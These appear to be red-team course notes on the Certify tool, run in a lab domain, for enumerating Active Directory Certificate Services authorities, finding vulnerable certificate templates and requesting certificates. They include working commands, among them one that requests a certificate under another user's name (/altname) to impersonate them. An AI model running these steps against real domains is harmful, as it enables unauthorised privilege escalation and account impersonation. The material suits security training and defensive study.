[GitHub Link](https://github.com/GhostPack/Certify)

## cas

---

Finds ADCS Certificate Authorities

``` 
C:\Tools\Certify\Certify\bin\Release\Certify.exe cas
```

This will output lots of useful information, including the root CA and subordinate CAs:

```
Enterprise CA Name            : ca
DNS Hostname                  : dc-1.cyberbotic.io
FullName                      : dc-1.cyberbotic.io\ca
Flags                         : SUPPORTS_NT_AUTHENTICATION, CA_SERVERTYPE_ADVANCED
Cert SubjectName              : CN=ca, DC=cyberbotic, DC=io
Cert Thumbprint               : 95AF7043BD6241CEE92E6DC6CB8D22494E396CCF
Cert Serial                   : 17DDB078863F61884B680FE6F59211AD
Cert Start Date               : 8/15/2022 3:42:59 PM
Cert End Date                 : 8/15/2047 3:52:59 PM
Cert Chain                    : CN=ca,DC=cyberbotic,DC=io

Enterprise CA Name            : sub-ca
DNS Hostname                  : dc-2.dev.cyberbotic.io
FullName                      : dc-2.dev.cyberbotic.io\sub-ca
Flags                         : SUPPORTS_NT_AUTHENTICATION, CA_SERVERTYPE_ADVANCED
Cert SubjectName              : CN=sub-ca, DC=dev, DC=cyberbotic, DC=io
Cert Thumbprint               : 697B1C2CD65B2ADC80C3D0CE83A6FB889B0CA08E
Cert Serial                   : 13000000046EF818036CF8C99F000000000004
Cert Start Date               : 8/15/2022 4:06:13 PM
Cert End Date                 : 8/15/2024 4:16:13 PM
Cert Chain                    : CN=ca,DC=cyberbotic,DC=io -> CN=sub-ca,DC=dev,DC=cyberbotic,DC=io
```

The Cert Chain is useful to note, as this shows us that "sub-ca" in the DEV domain is a subordinate of "ca" in the CYBER domain.  The output will also list the certificate templates that are available at each CA, as well as some information about which principals are allowed to manage them.


## find

---

Finds misconfigured ADCS templates.

```
C:\Tools\Certify\Certify\bin\Release\Certify.exe find /vulnerable
```

![](https://files.cdn.thinkific.com/file_uploads/584845/images/d7e/9d6/306/customuser.png)

Let's go through the key parts of this output.

1. This template is served by _sub-ca_.
2. The template is called _CustomUser_.
3. _ENROLLEE_SUPPLIES_SUBJECT_ is enabled, which allows the certificate requestor to provide any SAN (subject alternative name).
4. The certificate usage has _Client Authenticatio__n_ set.
5. _DEV\Domain Users_ have enrollment rights, so any domain user may request a certificate from this template.

  If a principal you control has WriteOwner, WriteDacl or WriteProperty, then this could also be abused.


## request

---

Requests certificate for user.

### Current User

Requests a certificate for the current user.

```
C:\Tools\Certify\Certify\bin\Release\Certify.exe request /ca:dc-2.dev.cyberbotic.io\sub-ca /template:User
```

### Custom User

Requests a certificate for the specified user.

```
C:\Tools\Certify\Certify\bin\Release\Certify.exe request /ca:dc-2.dev.cyberbotic.io\sub-ca /template:CustomUser /altname:nlamb
```


### Computer

The `/machine` parameter is required to auto-elevate to SYSTEM and assume the identity of the computer account.

```
C:\Tools\Certify\Certify\bin\Release\Certify.exe request /ca:dc-2.dev.cyberbotic.io\sub-ca /template:Machine /machine
```